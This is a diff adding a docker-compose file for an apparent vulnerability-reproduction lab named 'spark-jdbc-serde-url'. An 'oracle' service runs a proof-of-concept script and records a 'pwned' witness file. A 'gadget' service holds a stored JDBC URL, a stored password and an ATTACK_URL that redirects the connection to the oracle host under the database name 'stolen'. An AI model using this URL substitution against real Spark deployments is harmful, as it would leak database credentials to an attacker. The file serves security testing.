@@ -1,0 +1,53 @@
+name: spark-jdbc-serde-url
+
+services:
+  oracle:
+    image: python:3.13-slim
+    init: true
+    restart: "no"
+    environment:
+      PYTHONUNBUFFERED: "1"
+      LAB_ROLE: oracle
+      BIND_HOST: "0.0.0.0"
+      BIND_PORT: "18960"
+      HTTP_PORT: "18961"
+      WITNESS_PATH: /oracle/pwned.txt
+      HITS_PATH: /oracle/hits.jsonl
+      LABEL: SPARK-JDBC-SERDE-URL
+      WITNESS: SPARK-JDBC-SERDE-URL-WITNESS
+    volumes:
+      - ./poc.py:/lab/poc.py:ro
+      - ./oracle:/oracle
+    command: ["python3", "/lab/poc.py", "--role", "oracle"]
+    ports:
+      - "127.0.0.1:18960:18960"
+      - "127.0.0.1:18961:18961"
+    healthcheck:
+      test:
+        [
+          "CMD",
+          "python3",
+          "-c",
+          "import urllib.request; urllib.request.urlopen('http://127.0.0.1:18961/health', timeout=2)",
+        ]
+      interval: 2s
+      timeout: 3s
+      retries: 20
+      start_period: 2s
+
+  gadget:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    init: true
+    restart: "no"
+    depends_on:
+      oracle:
+        condition: service_healthy
+    environment:
+      STORED_URL: "jdbc:postgresql://127.0.0.1:1/provisioned?sslmode=disable&gssEncMode=disable"
+      ATTACK_URL: "jdbc:postgresql://oracle:18960/stolen?sslmode=disable&gssEncMode=disable"
+      JDBC_USER: spark_jdbc
+      JDBC_PASSWORD: stored-secret-SPARK-JDBC-SERDE-URL
+      JDBC_DBTABLE: secret_accounts
+    command: ["sleep", "infinity"]
